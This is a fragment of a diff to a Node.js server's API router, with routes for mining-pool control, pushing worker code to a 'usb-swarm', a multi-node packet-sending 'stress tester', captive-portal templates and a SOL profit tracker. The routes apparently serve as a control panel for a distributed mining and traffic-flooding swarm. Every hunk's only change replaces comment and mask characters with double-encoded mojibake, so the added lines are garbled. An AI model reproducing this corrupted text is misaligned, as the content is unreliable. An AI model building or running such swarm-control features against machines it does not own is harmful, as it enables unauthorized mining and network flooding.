       try { mcfgPools = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'config.json'), 'utf8')).miner || {}; } catch(e) {}
@@ -5645,7 +5902,7 @@ undefined
       return json(res, 200, { pools: pools, currentPool: mcfgPools.poolUrl || 'rx.unmineable.com:3333', autoSwitch: mcfgPools.autoSwitch || false });
     }
 
-    // â•â•â• POST /api/miner/auto-switch â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/miner/auto-switch Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/miner/auto-switch') {
       var body = JSON.parse(await readBody(req));
       var asCfgPath = path.join(__dirname, '..', 'config.json');
@@ -5668,7 +5925,7 @@ undefined
       } catch(e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/miner/benchmark â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/miner/benchmark Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/miner/benchmark') {
       // Broadcast mine-benchmark to swarm workers via relay
       var bmUsbDir = path.join(__dirname, '..', 'usb-swarm');
@@ -5695,12 +5952,12 @@ undefined
       } catch(e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/miner/benchmark â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/miner/benchmark Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/miner/benchmark') {
       return json(res, 200, { results: _refs._benchmarkResults || {} });
     }
 
-    // â•â•â• POST /api/swarm/update-workers â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/swarm/update-workers Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/swarm/update-workers') {
       var uswDir = path.join(__dirname, '..', 'usb-swarm');
       var workerCode = '', workerLinuxCode = '';
@@ -5729,14 +5986,14 @@ undefined
       } catch(e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/miner/alerts â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/miner/alerts Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/miner/alerts') {
       var ma = _refs.minerAlerts;
       if (!ma) return json(res, 200, { alerts: [] });
       return json(res, 200, { alerts: ma.getAlertHistory(50) });
     }
 
-    // â•â•â• POST /api/miner/alerts/config â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/miner/alerts/config Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/miner/alerts/config') {
       var body = JSON.parse(await readBody(req));
       var ma = _refs.minerAlerts;
@@ -5746,7 +6003,7 @@ undefined
       return json(res, ok ? 200 : 500, ok ? { status: 'saved' } : { error: 'Failed to save config' });
     }
 
-    // â•â•â• POST /api/miner/alerts/test â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/miner/alerts/test Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/miner/alerts/test') {
       var ma = _refs.minerAlerts;
       if (!ma) return json(res, 500, { error: 'MinerAlerts not available' });
@@ -5756,7 +6013,7 @@ undefined
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/miner/map â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/miner/map Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/miner/map') {
       var ma = _refs.minerAlerts;
       if (!ma) return json(res, 200, { workers: [] });
@@ -5768,11 +6025,11 @@ undefined
 
     } // end admin-only mining routes
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-    // PACKET SEND â€" Internal Network Stress Tester
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+    // PACKET SEND Ã¢â‚¬" Internal Network Stress Tester
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• POST /api/packet-send/start â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/packet-send/start Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/packet-send/start') {
       var ps = refs.packetSend;
       if (!ps) return json(res, 500, { error: 'PacketSend not available' });
@@ -5783,7 +6040,7 @@ undefined
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/packet-send/stop â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/packet-send/stop Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/packet-send/stop') {
       var ps = refs.packetSend;
       if (!ps) return json(res, 500, { error: 'PacketSend not available' });
@@ -5793,7 +6050,7 @@ undefined
       return json(res, 200, { stopped: ps.stopAll() });
     }
 
-    // â•â•â• GET /api/packet-send/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/packet-send/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/packet-send/status') {
       var ps = refs.packetSend;
       if (!ps) return json(res, 200, { active: false, elapsed: 0, duration: 0, aggregate: {}, perNode: {} });
@@ -5822,7 +6079,7 @@ undefined
       });
     }
 
-    // â•â•â• POST /api/packet-send/validate â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/packet-send/validate Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/packet-send/validate') {
       var ps = refs.packetSend;
       if (!ps) return json(res, 500, { error: 'PacketSend not available' });
@@ -5830,7 +6087,7 @@ undefined
       return json(res, 200, ps.validateTarget(body.ip || body.target || ''));
     }
 
-    // â•â•â• POST /api/packet-send/node-report â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/packet-send/node-report Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/packet-send/node-report') {
       var ps = refs.packetSend;
       if (!ps) return json(res, 500, { error: 'PacketSend not available' });
@@ -5839,7 +6096,7 @@ undefined
       return json(res, 200, { ok: true });
     }
 
-    // â•â•â• GET /api/notifications â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/notifications Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/notifications') {
       var wr = refs.warRoom;
       var feed = wr ? wr.getActivityFeed(parseInt(parsed.query.limit) || 50) : [];
@@ -5851,16 +6108,16 @@ undefined
       return json(res, 200, { notifications: feed, unread: unread, total: feed.length });
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-    // SETTINGS â€" Token Management
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+    // SETTINGS Ã¢â‚¬" Token Management
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/settings/tokens â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/settings/tokens Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/settings/tokens') {
       const cfg = refs.config || {};
       function mask(val) {
-        if (!val || typeof val !== 'string' || val.length < 5) return val ? 'â€¢â€¢â€¢â€¢' : '';
-        return 'â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢' + val.slice(-4);
+        if (!val || typeof val !== 'string' || val.length < 5) return val ? 'Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢' : '';
+        return 'Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢' + val.slice(-4);
       }
       return json(res, 200, {
         aiToken: mask(cfg.fallback?.directApi?.key || cfg.ariesGateway?.providers?.anthropic?.apiKey || ''),
@@ -5884,7 +6141,7 @@ undefined
       });
     }
 
-    // â•â•â• POST /api/settings/tokens â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/settings/tokens Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/settings/tokens') {
       const body = JSON.parse(await readBody(req));
       const configPath = path.join(__dirname, '..', 'config.json');
@@ -5947,7 +6204,7 @@ undefined
       } catch (e) { return json(res, 500, { error: 'Failed to write config: ' + e.message }); }
     }
 
-    // â•â•â• POST /api/settings/test-token â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/settings/test-token Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/settings/test-token') {
       const body = JSON.parse(await readBody(req));
       const tokenToTest = body.token;
@@ -5994,11 +6251,11 @@ undefined
       }
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // DISTRIBUTED AI & MODEL SHARING
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• POST /api/ai/distributed â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/ai/distributed Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/ai/distributed') {
       const body = JSON.parse(await readBody(req));
       if (!body.prompt) return json(res, 400, { error: 'Missing "prompt" field' });
@@ -6017,7 +6274,7 @@ undefined
       }
     }
 
-    // â•â•â• GET /api/swarm/models â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/swarm/models Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/swarm/models') {
       const modelSharing = require('./model-sharing');
       try {
@@ -6026,7 +6283,7 @@ undefined
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/swarm/models/share â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/swarm/models/share Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/swarm/models/share') {
       const body = JSON.parse(await readBody(req));
       const modelSharing = require('./model-sharing');
@@ -6037,7 +6294,7 @@ undefined
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• Captive Portal Endpoints â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â Captive Portal Endpoints Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/captive-portal/status') {
       var cp = refs.captivePortal;
       if (!cp) return json(res, 500, { error: 'Captive portal not available' });
@@ -6073,18 +6330,18 @@ undefined
       return json(res, 200, { templates: cp6.getTemplates() });
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-    // PROFIT DASHBOARD â€" SOL Balance Tracking
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+    // PROFIT DASHBOARD Ã¢â‚¬" SOL Balance Tracking
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/profit/balance â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/profit/balance Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/profit/balance') {
       var pt = refs.profitTracker;
       if (!pt) return json(res, 200, { balance: null, solPrice: 0, usdValue: null });
       return json(res, 200, pt.getBalance());
     }
 
-    // â•â•â• GET /api/profit/history â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/profit/history Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/profit/history') {
       var pt2 = refs.profitTracker;
       if (!pt2) return json(res, 200, { history: [] });
@@ -6092,18 +6349,18 @@ undefined
       return json(res, 200, { history: pt2.getHistory(limit) });
     }
 
-    // â•â•â• GET /api/profit/summary â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/profit/summary Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/profit/summary') {
       var pt3 = refs.profitTracker;
       if (!pt3) return json(res, 200, { balance: null, totalEarned: 0, todayEarned: 0 });
       return json(res, 200, pt3.getSummary());
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-    // WORKER CHAT â€" Inter-Worker Communication
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+    // WORKER CHAT Ã¢â‚¬" Inter-Worker Communication
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/swarm/chat â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/swarm/chat Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/swarm/chat') {
       var wc = refs.workerChat;
       if (!wc) return json(res, 200, { messages: [] });
@@ -6112,7 +6369,7 @@ undefined
       return json(res, 200, { messages: wc.getMessages(chatLimit, chatWorker) });
     }
 
-    // â•â•â• POST /api/swarm/chat â•â•â•
